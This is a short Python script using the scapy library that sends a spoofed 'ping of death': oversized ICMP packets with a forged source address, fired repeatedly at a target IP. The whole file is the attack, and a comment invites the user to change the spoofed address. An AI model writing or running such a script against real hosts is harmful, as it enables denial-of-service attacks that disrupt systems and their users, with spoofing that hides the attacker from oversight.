#!/usr/bin/python

from scapy.all import *

SOURCE_IP = "10.1.5.3" # Change this IP to spoof
TARGET_IP = "10.1.5.2"
MESSAGE = "A"
NUMBER_PACKETS=5 # Number of pings

pingOFDeath = IP(src=SOURCE_IP, dst=TARGET_IP)/ICMP()/(MESSAGE*60000)

send(NUMBER_PACKETS * pingOFDeath)